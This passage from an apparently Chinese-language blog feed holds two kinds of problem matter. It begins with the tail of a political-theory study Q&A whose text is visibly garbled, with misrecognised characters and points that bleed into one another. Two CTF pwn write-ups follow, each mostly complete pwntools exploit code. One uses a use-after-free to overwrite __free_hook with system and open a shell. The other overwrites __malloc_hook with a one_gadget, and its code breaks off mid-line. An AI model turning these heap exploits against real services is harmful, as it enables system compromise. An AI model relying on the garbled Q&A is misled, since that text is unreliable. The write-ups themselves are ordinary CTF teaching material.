id="7-党在中国社会主义建设道路的初步探索中取得了哪些重要的理论成果？"><a href="#7-党在中国社会主义建设道路的初步探索中取得了哪些重要的理论成果？" class="headerlink" title="7.党在中国社会主义建设道路的初步探索中取得了哪些重要的理论成果？"></a>7.党在中国社会主义建设道路的初步探索中取得了哪些重要的理论成果？</h4><p>（1）提出马克思主义和中国实际的 “第二次结合〞，为探索适合中国情況的社会主义建设道路，提供了基本的指导原则。</p><p>（2）提出“向现代科学进军〞的口号，制定了科学技术发展远景规划纲要，开始了向世界科学技术先进水平的进军。</p><p>（3）《论十大关系》的发光，是以毛深东为主要代表的中四共产觉人开始探紫中四自己的社公主义徙设道路的标志，它在新的历史尔什下从经济方面(这是主要的）和政治方面捉出了新的指导方针，为中共八大的召开做了理论准各。又搞资本主义”等。</p><p>（4）明了方向,中共八大后,中国共产党在探索中又提出一些亚要的新恩想，如“可以消次了这本主义，</p><p>（5）《关于正确处理人民内部不盾的问题》 的发表，它创造性地网述了社会主义社会不盾学说，是对科学社会主义理论的重要发展，对中国社会主义事业具有长远的指导意义。</p><p>（6）进行整风和提出建设“六又” 政治局面等思想，是中共八大路线的继续和发展，是觉探索社会主义建设道路的新成果。</p><h4 id="8-如何理解邓小平理论首要的基本的理论问题？"><a href="#8-如何理解邓小平理论首要的基本的理论问题？" class="headerlink" title="8. 如何理解邓小平理论首要的基本的理论问题？"></a>8. 如何理解邓小平理论首要的基本的理论问题？</h4><p>答：邓小平理论首要的基本问题就是什么是社会主义、怎样建设社会主义。社会主义的本质，是解放生产力，发展生产力，消灭剥削，消除两极分化，最终达到共同富裕。关于怎样建设社会主义，双小平指出，要把马克思主义的普遍真理同我国的具体实践结合起来，走自己的路，建设有中国特色的社会主义。</p><h4 id="9-试述社会主义初级阶段的基本路线。"><a href="#9-试述社会主义初级阶段的基本路线。" class="headerlink" title="9.试述社会主义初级阶段的基本路线。"></a>9.试述社会主义初级阶段的基本路线。</h4><p>（1）“建设富强民主义明和谐的社会主义现代化国家”。这是基本路线规定的觉在社会主义初级阶段的奋斗目标。体现了社会主义社会的经济、政治、文化和社会全面发展的要求。</p><p>（2)  “一个中心两个基本点”。这是基本路线最主要的内容是实现社会主义现代化奋斗日标的基本途径。是正确认识和处理经济基础和上层建筑之间、生产力和生产关系之问辦证统一关系的内在要求。</p><p>（3）“领导和國结全国各族人民”。这是实现社会主义现代化奋斗目标的领导力量和依靠力量。</p><p>（4）“自力更生艰苦创业”。这是我们党的优良传统也是实现社会主义初级阶段奋斗目标的根本立足点。</p><h4 id="10-邓小平关于社会主义市场经济理论的主要内涵是什么？"><a href="#10-邓小平关于社会主义市场经济理论的主要内涵是什么？" class="headerlink" title="10.邓小平关于社会主义市场经济理论的主要内涵是什么？"></a>10.邓小平关于社会主义市场经济理论的主要内涵是什么？</h4><p>（1）突破了过去公认的计划经济和市场经济是代表社会主义和资本主义两种经济制度本质属性的观念，认为它们都是经济手段。</p><p>（2）计划与市场作为调节经济的两种手段，它们对经济活动的调节各有自己的优势和长处，还有自身的不足和缺陷，在社会化大生产和存在着复杂经济关系的条件下，市场经济对促进经济发展具有更强的适应性、更显著的优势和较高的效率。但两者都有自身的不足和缺陷，如计划经济不能有效解決效率和激励问题，市场经济的自发性、盲目性会引发恶性竞争、短期行为、道德缺失等。</p><p>（3） 市场经济作为资源配置的一种方式本身不具有制度属性，但是，它与社会主义相结合而形成的经济体制则必须体现社会主义基本制度的特征。把发展市场经济与坚持社会主义基本制度有机结合起来，既可以充分发挥社会主义制度的优越性，又可以充分利用市场经济对发展生产力的作用。</p><h4 id="11-怎样准确把握“三个代表，重要思想的核心观点？"><a href="#11-怎样准确把握“三个代表，重要思想的核心观点？" class="headerlink" title="11.怎样准确把握“三个代表，重要思想的核心观点？"></a>11.怎样准确把握“三个代表，重要思想的核心观点？</h4><p>关健在坚持与时俱进，校心在坚持党的先进性，本质在坚持执政为民，这“三向话”是“三个代天”科学内酒的精神实历，足贸彻落实…三个代表，重要思想的根木要求，也是继“七一，讲话之后对“三个代表”亚要思想的新概括、新河发。我们要联系实际全面理解、正确把握这“三向话”，真正做到在理论上十分清醒，在政治上十分坚定，在行动上十分自觉。</p><h4 id="12-简述科学发展观的科学内涵和精神实质"><a href="#12-简述科学发展观的科学内涵和精神实质" class="headerlink" title="12.简述科学发展观的科学内涵和精神实质"></a>12.简述科学发展观的科学内涵和精神实质</h4><ul><li><p>第一，坚持以人为本。坚持以人为本，就是要以实现人的全面发展为目标，从人民群众的根本利益出发谋发展、促发展，不断满足人民群众日益增长的物质文化需要，切实保障人民群众的经济、政治、文化权益，让发展惠及全体人民。</p></li><li><p>第二，坚持全面发展。就是要以经济建设为中心，全面推进经济建设、政治建设、文化建设和社会建设，实现经济发展和社会全面进步。</p></li><li><p>第三，坚持协调发展。就是要统筹城乡、统筹区域、统筹经济社会发展、统筹人与白然和谐发展、统等国内发展和对外开放，推进生产力和生产关系、经济基础和上层建筑相协调，推进经济建设、政治建设、文化建设、社会建设各个环节、各个方面相协调。</p></li><li><p>第四，坚持协调可持续发展。就是要促进人与自然的和谐，实现经济发展与人口、资源、环境相协调，坚持走生产发展、生活富裕、生态良好的文明发展道路，保证一代又一代永续发展。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;马克思主义中国化时代化的几大理论成果各自回答了什么问题？&quot;&gt;&lt;a href=&quot;#马克思主义中国化时代化的几大理论成果各自回答了什么问题？&quot; class=&quot;headerlink&quot; title=&quot;马克思主义中国化时代化的几大理论成果各自回答了什么问题？&quot;&gt;&lt;/a&gt;马克</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PWNHUB sh_v1_1</title>
    <link href="https://starrysky1004.github.io/2023/03/13/pwnhub-sh-v1-1/pwnhub-sh-v1-1/"/>
    <id>https://starrysky1004.github.io/2023/03/13/pwnhub-sh-v1-1/pwnhub-sh-v1-1/</id>
    <published>2023-03-13T13:28:44.000Z</published>
    <updated>2023-03-13T13:44:16.083Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol><li>rm 释放堆之后未清零造成 UAF 漏洞</li><li>ln 执行时仅判断第一个文件是否存在而不会判断第二个文件是否存在，且连接成功后不存在的文件将被添加到文件列表</li></ol><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol><li><p>利用两个相同大小的unsorted bin合并，申请一个相同大小的堆块，堆快中残留的fd，可以泄露到 malloc_hook地址进而泄露libc基址</p></li><li><p>删除一个堆之后与另一个堆进行连接</p></li><li><p>再次删除这个堆，即间接的删除了与其进行连接的堆，而不会造成与其连接的堆从文件列表消失</p></li><li><p>再次连接后删除的文件又在文件列表中出现，此时两个文件即两个堆都已经被释放，且最开始被连接的堆的fd为其之后连接的堆</p></li><li><p>用gedit编辑最开始被释放的堆，即可修改其fd，再次申请就可以实现任意地址写</p></li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./sh_v1.1'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.40.89.206'</span><span class="token punctuation">,</span><span class="token number">34883</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">touch</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'touch '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> <span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'rm '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cp</span><span class="token punctuation">(</span>filename1<span class="token punctuation">,</span> filename2<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'cp '</span> <span class="token operator">+</span> filename1 <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span>  filename2    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cat</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'cat '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gedit</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'gedit '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ln</span><span class="token punctuation">(</span>filename1<span class="token punctuation">,</span> filename2<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'ln '</span> <span class="token operator">+</span> filename1 <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span>  filename2    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>    touch<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p1  <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>    rm<span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>    touch<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span>cat<span class="token punctuation">(</span><span class="token string">'try7.txt'</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1104</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseli<span class="token punctuation">(</span><span class="token string">'free_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basetouch<span class="token punctuation">(</span><span class="token string">'try8.txt'</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">)</span>ln<span class="token punctuation">(</span><span class="token string">'try6.txt'</span><span class="token punctuation">,</span> <span class="token string">'try0.txt'</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">)</span>ln<span class="token punctuation">(</span><span class="token string">'try6.txt'</span><span class="token punctuation">,</span> <span class="token string">'try0.txt'</span><span class="token punctuation">)</span>gedit<span class="token punctuation">(</span><span class="token string">'try0.txt'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'try10.txt'</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>touch<span class="token punctuation">(</span><span class="token string">'try11.txt'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>rm<span class="token punctuation">(</span><span class="token string">'try10.txt'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;rm 释放堆之后未清零造成 UAF 漏洞&lt;/li&gt;
&lt;li&gt;ln 执行时仅判断第一个文件是否存在而不会判断第二个</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="UAF" scheme="https://starrysky1004.github.io/tags/UAF/"/>
    
    <category term="heap" scheme="https://starrysky1004.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>UAF例题分析</title>
    <link href="https://starrysky1004.github.io/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/"/>
    <id>https://starrysky1004.github.io/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/</id>
    <published>2023-01-27T01:05:54.000Z</published>
    <updated>2023-02-04T10:13:27.327Z</updated>
    
    <content type="html"><![CDATA[<h3 id="IDA分析程序"><a href="#IDA分析程序" class="headerlink" title="IDA分析程序"></a>IDA分析程序</h3><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/1.png" class><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/2.png" class><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/3.png" class><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/4.png" class><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/5.png" class><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>delete函数中<code>free((void *)heap_ptr[v1]);</code>释放堆之后未将heap_ptr[v1]清零，导致了UAF漏洞</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul><li>利用<code>unsorted bin</code>和<code>main arean </code>连接的特点和UAF漏洞泄露libc地址</li><li>利用UAF漏洞将<code>__malloc_hook</code>改写为ogg</li><li>利用double free的错误触发<code>__malloc_hook</code>执行ogg</li></ul><h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.<code>unsorted bin</code>中两个相邻的空闲堆会合并，所以要先创建两个堆即index为0的堆和index为1的堆，且index为0的堆大小属于unsorted bin</p><p>2.用delete释放index为0的堆，此时heap_ptr[0]仍然指向index为0的堆的地址，再用show输出堆的内容，此时堆已经被释放，所以输出的是该堆的fd</p><p>3.接收输出的地址，该地址在<code>main_arena+88</code>的地方，而<code>__malloc_hook</code>在<code>main_arena</code>向上0x10的地址，因此<code>__malloc_hook</code>地址为接收到的地址-88-0x10</p><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/6.png" class><p>4.计算libc基址以及利用one_gadget工具得到gadget</p><p>5.<code>unsorted bin</code>中存在堆则申请堆块会从<code>unsorted bin</code>中切割而不会用<code>fast bin</code>中的堆，因此需要再创建一个堆将<code>unsorted bin</code>中的堆抵消</p><p>6.释放大小属于fast bin的堆，再去edit堆的内容，此时修改的是fd，由于fast bin是依靠fd连接的，第二次申请的与释放掉的堆相同大小的堆地址就在被修改的fd的地址，edit第二个堆改写成ogg即可实现任意地址写，但是glibc 2.23中存在一项检测机制</p><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/7.png" class><p>该机制会判断申请的堆的大小和得到的堆的size位的大小是否同属于一个bin链表中，因此需要寻找一个符合条件的地址作为堆的地址，利用<code>find_fake_fast</code>寻找地址并计算到<code>__malloc_hook</code>的距离</p><img src="/2023/01/27/uaf-li-ti-fen-xi/uaf-li-ti-fen-xi/8.png" class><p>该chunk的size位大小为0x7f，因此要创建0x60~0x6E大小的堆，将fd改成<code>__malloc_hook </code>-相对距离，即可申请到这个地址并且不报错，由于user data在堆起始地址下0x10，所以要先填充0x13的垃圾数据加上ogg</p><p>7.将同一个堆连续delete两次即可触发ogg</p><h3 id="完整exp如下"><a href="#完整exp如下" class="headerlink" title="完整exp如下"></a>完整exp如下</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>menu <span class="token operator">=</span> <span class="token string">'choice >> '</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">88</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>li<span class="token punctuation">(</span><span class="token string">'libc_base = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x13</span> <span class="token 